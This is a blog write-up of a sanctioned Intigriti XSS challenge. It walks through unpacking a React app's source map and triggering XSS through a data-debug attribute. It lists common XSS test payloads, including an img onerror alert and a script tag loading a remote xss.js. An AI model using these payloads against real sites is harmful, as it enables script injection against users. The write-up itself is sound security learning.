> This was my first ever Intigriti XSS challenge writeup which also won me my first Intigriti `swag` ever. [**Intigriti's Tweet**](https://twitter.com/intigriti/status/1483056799813091331).
{: .prompt-tip }

It‚Äôs January the 10th, we are in the second week of January so I still have the new years motivation going on and when opening twitter the first thing I find is this.

_Challenge Tweet by @intigriti_

I have always wanted to solve an Intigriti XSS challenge but didn't have the time to solve any. But I really wanted to solve this because in the same morning the challenge was posted in I saw this tweet by @nnwakelam.

_Write up Tweet by @nnwakelam_

This is a really neat write up by @Psych0tr1a that talked about XSS in different parsers, and so I was ready to take on the Intigriti HTML parser.

## The application

Whether it's a simple CTF challenge, Hackthebox machine or bug bounty program I always like to start off by taking a general look at the application and just see what it's supposed to do. No inspect element. No Injecting random payloads.

_First Test_

![Desktop View](/assets/images/blog_2_image_4.png){: width="972" height="589" }
_Result of the first test_

We can see that the page takes text from the **payload** parameter and reflects it in the body of the application, we should keep the first page in mind just in case but for now, we can try our payloads from here.

## Let the testing begin (kinda)

I say kinda because In this stage I start to test for stuff but not maliciously, I try injecting non-harmful tags like `<h1>`, `<span>` and `<br>`. Basically HTML injection.

I expect them to work since after all ‚Ä¶ it's an HTML parser.

![Desktop View](/assets/images/blog_2_image_5.png){: width="972" height="589" }
_Second test with simple HTML tags_

Works fine what about a <img> tag with src set to an external picture.

_External Image Test_

## Let the real testing begin

Let our favourite inspect element start its work (or burp if you like that better). Our questions as hunters right now are simple, what tags are allowed and what attributes are allowed.

Now, who are we kidding we all tried `<img src=x onerror=‚Äùalert(1)‚Äù>` already üëÄü§∑ I did too. But we see that the onerror gets removed.

![Desktop View](/assets/images/blog_2_image_7.png){: width="972" height="589" }
_Our first malicious payload_

I tried different real attributes and non-existent (fake) attributes. The fake attributes didn't work and so there is a kind of a whitelist going on. (Turns out to be DOMPurify later)

On another note, adding an src attribute to a `<br>` tag for example works even though it's [**useless**](https://www.w3docs.com/learn-html/html-br-tag.html).

You can always try simple XSS tests and payloads, you can start with simple payloads like these

```
'"< >( )`
<img src=x onerror=alert(document.domain)>
<SCRIPT SRC=http://lol.com/xss.js></SCRIPT>
<a onmouseover="alert(document.domain)">xxs link</a>
<a href="javascript:alert(document.domain)">
```

But just looking through the inspect element I could see that the app uses [**DOMPURIFY**](https://www.w3docs.com/learn-html/html-br-tag.html](https://lists.ruhr-uni-bochum.de/mailman/listinfo/dompurify-security#:~:text=DOMPurify%20is%20a%20DOM%2Donly,else%20using%20Blink%20or%20WebKit) so those payloads would most likely not work and if they worked this wouldn't be called a challenge.

## Reading the javascript

We always have to read the javascript to see how this works and I noticed that the app uses React. You can use chrome extensions like Wappalyzer to tell you what technologies run on a web app.

Some knowledge kinda came into play here because I noticed that in the last line of the js file it has the .map file for the javascript.

And I have read writeups before that use it to read the source code of an application. I knew this is the way. (Was confirmed later by the Tip posted by Intigriti)

I really recommend reading these:

<https://bitthebyte.medium.com/javascript-for-bug-bounty-hunters-part-2-f82164917e7>

## Unpacking the source code of the application

There are many tools to unpack the source code of a react application. One is mentioned in the blog post above.

<https://github.com/rarecoil/unwebpack-sourcemap>

But I personally used a tool made by @spaceraccoon called [**webpack-exploder**](https://github.com/spaceraccoon/webpack-exploder).

You can unpack the .map file using the UI interface hosted online by spaceracoon himself here: <https://spaceraccoon.github.io/webpack-exploder/>

## Source code review

Unpacking the map file gives you a folder with the source code (eh).

![Desktop View](/assets/images/blog_2_image_11.png){: width="972" height="589" }
_First look at the supposed source code_

I noticed that the code is still obfuscated but looking throughout the files, specifically in the router.js I found base64 looking strings so I just tried decoding them.

![Desktop View](/assets/images/blog_2_image_12.png){: width="972" height="589" }
_Decoding base64 strings in router.js_

We can see that there are some juicy strings in there like ‚ÄúhandleAttributes‚Äù and ‚ÄúsanitizeHTML‚Äù etc. I also noticed the identifiers used in the index.js‚Äôs of both the Home route and Result route, so I have to substitute the values to the decoded values of base64 strings to make it possible for the code to be analyzed.

![Desktop View](/assets/images/blog_2_image_13.png){: width="972" height="589" }
_Substituting values from routes.js_

Even though it's still not that clear I could still make some sense out of it.

In the index .js file in Result folder/route (I0x1) there were 3 functions

1. Result
2. handleAttributes
3. sanitizeHTML

The Result function seems to check if there is a get parameter with the name of **payload**, if there is it returns its value as **result**. If there isn't a payload or the value is empty it returns **result** as an h1 tag with ‚ÄúNothing here!‚Äù.

The function didn't seem to be interesting at all, I tried understanding the ‚Äúlocation‚Äù and ‚Äúsearch‚Äù in line 8 but couldn't find anything useful.

![Desktop View](/assets/images/blog_2_image_14.png){: width="972" height="589" }
_Result function_

The handleAttributes function was interesting because ‚Ä¶ it handles attributes. It takes in an **element** and a for loop seems to check the [**children**](https://www.w3schools.com/jsref/prop_element_children.asp) of the element given in, it then checks if ‚Äúdata-debug‚Äù is an attribute and there is a new function that gets the value of the data-debug attribute.

![Desktop View](/assets/images/blog_2_image_15.png){: width="972" height="589" }
_handleAttributes Function_

I spent some time reading the MDN for Element.getAttribute() & Element.attributes just to make sure I am getting this.

<https://developer.mozilla.org/en-US/docs/Web/API/Element>

Now without even taking a look at the sanitizeHTML, I was able to get the XSS, I have seen the [**data-* attributes**](https://developer.mozilla.org/en-US/docs/Learn/HTML/Howto/Use_data_attributes) before but I am not that knowledgeable about them so I was interested in adding the data-debug attribute to an element.

![Desktop View](/assets/images/blog_2_image_16.png){: width="972" height="589" }
_Adding data-debug attribute_

After adding it to an h1 tag the page broke.

![Desktop View](/assets/images/blog_2_image_17.png){: width="972" height="589" }
_Page broken_

My 3rd or 4th payload was confirm(1) and it luckily worked.

![Desktop View](/assets/images/blog_2_image_18.png){: width="972" height="589" }
_Successful XSS payload_

I tried grepping for ‚Äúdata-debug‚Äù to understand the cause of this bug but couldn't find any other reference to it.

![Desktop View](/assets/images/blog_2_image_19.png){: width="972" height="589" }
_Greping for the string ‚Äúdata-debug‚Äù_

The application uses DOMPurify to sanitize input and so I read some StackOverflow questions and some DOMPurify docs to try to understand the cause of this issue but couldn't get to a conclusion.

<https://stackoverflow.com/questions/57954967/why-does-dompurify-with-safe-for-templates-removes-data-attributes>

<https://github.com/cure53/DOMPurify#can-i-configure-dompurify>

## Conclusion: A Failed Success

I was able to get the XSS but I am still not satisfied with my findings, I am really looking forward to the video solution of the challenge to understand the cause of this issue.

Is it a misconfiguration in the purify.js file? A mistake in the handleAttributes or sanitizeHTML function? [**I guess we will never know**](https://youtu.be/OGBoXqdWkvc).

Thanks for reading.
